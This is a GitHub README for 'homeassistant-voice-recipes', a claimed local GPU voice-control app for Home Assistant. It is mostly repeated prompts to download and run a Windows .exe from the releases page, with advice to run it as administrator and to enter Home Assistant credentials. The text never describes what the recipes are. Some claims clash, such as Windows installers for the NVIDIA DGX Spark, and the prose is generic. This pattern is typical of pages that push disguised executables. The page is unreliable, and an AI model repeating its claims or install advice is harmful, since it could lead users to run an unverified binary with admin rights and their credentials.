# 🎙️ homeassistant-voice-recipes - Voice Control Made Local and Fast

[![Download on GitHub](https://img.shields.io/badge/Download-Homeassistant%20Voice%20Recipes-green?style=for-the-badge)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)

---

homeassistant-voice-recipes is a voice control tool designed to work completely on your device. It uses your graphics card (GPU) to speed up voice commands for Home Assistant. This means no internet connection or cloud services are needed. It works on many computers, including those with Intel or AMD chips and newer ARM64 devices, like NVIDIA DGX Spark.

---

## 🖥️ System Requirements

Before you start, make sure your setup fits these requirements:

- **Operating System:** Windows 10 or 11 (64-bit preferred)
- **Processor:** x86-64 or ARM64 (including NVIDIA DGX Spark support)
- **GPU:** NVIDIA GPU that supports CUDA for faster processing (recommended but not required)
- **RAM:** Minimum 8 GB, 16 GB or more is better for smooth performance
- **Disk Space:** At least 2 GB free for installing the app and related files
- **Microphone:** Any Windows-compatible microphone for voice input
- **Home Assistant:** You should have Home Assistant running somewhere in your network to connect with this tool

---

## 🌐 What This Does

homeassistant-voice-recipes lets you control your smart home with voice commands. It turns what you say into actions using local speech-to-text and text-to-speech tools. The software does this fast thanks to GPU acceleration. You stay in control of your privacy since no data leaves your computer.

---

## 🔽 Download and Install

### Step 1: Go to the download page

Click the big green button below to open the release page. This page holds the files you need.

[![Download on GitHub](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)

### Step 2: Choose the right file

Look for the latest version (highest number) and find the Windows installer. It will usually end with `.exe`.

- If you have a standard Windows PC, pick the **x86-64** version.
- If you have a device with an ARM64 chip, like some newer laptops or NVIDIA DGX Spark, choose the ARM64 version.

### Step 3: Download the file

Click the file name to start downloading. This might take a few moments depending on your internet speed.

### Step 4: Run the installer

- Find the downloaded file in your Downloads folder.
- Double-click it to open.
- Follow the on-screen instructions.
- It will install the software on your system.

---

## ▶️ How to Use homeassistant-voice-recipes on Windows

### Step 1: Open the app

Once installed, you can open the program from the Start menu or the desktop shortcut.

### Step 2: Set up your microphone

- The app should detect your microphone automatically.
- If not, go to Settings inside the app.
- Select your preferred microphone under Input Devices.
- Speak a few words to test sound capture.

### Step 3: Connect to Home Assistant

- Enter the IP address or local network name of your Home Assistant server.
- Add any required username and password if your Home Assistant uses authentication.
- Click Connect.

### Step 4: Start voice control

- Press the Start button inside the app.
- Say voice commands naturally.
- The app will convert your speech to text and send commands to Home Assistant.
- Responses and status messages show in the app window.

---

## ⚙️ Features and Benefits

- **Local Processing:** Your voice data never leaves your computer.
- **GPU Acceleration:** Fast and efficient processing using CUDA.
- **Multiple Architectures:** Works on both x86-64 and ARM64 devices.
- **Speech-to-Text and Text-to-Speech:** Built-in support for understanding and replying.
- **Simple Setup:** No programming required; use the app’s interface.
- **Flexible:** Connects easily to any running Home Assistant.

---

## 🔧 Troubleshooting Tips

- **Microphone not detected?** Check Windows privacy settings to make sure apps can use the mic.
- **Connection failed?** Verify the Home Assistant IP address and credentials.
- **Slow performance?** Confirm your GPU drivers are up to date.
- **App won’t start?** Run as administrator or reinstall.
- **No audio output?** Check Windows sound settings and app output settings.

---

## 📂 File Structure (After Installation)

Inside the installation folder, you will find:

- `voice_recipes.exe` - main application file
- `config` folder - contains app settings and connection info
- `logs` folder - stores activity logs for troubleshooting
- `models` folder - speech models used for voice input/output processing

---

## 🛠️ Updating the Software

To get updates:

1. Visit the release page again:  
   https://github.com/vrajpatel30/homeassistant-voice-recipes/releases  
2. Download the newest installer.
3. Run it to overwrite your old version while keeping your settings.

---

## 📞 Getting Support

Use the GitHub issues page to report any problems or ask questions:  

https://github.com/vrajpatel30/homeassistant-voice-recipes/issues

---

## 🧰 Additional Tips

- Restart the app after changing settings.
- Use a good quality microphone for clearer voice recognition.
- Keep your Home Assistant and Windows system updated to avoid compatibility issues.

---

For latest releases and downloads:  
[Click here to visit the release page](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)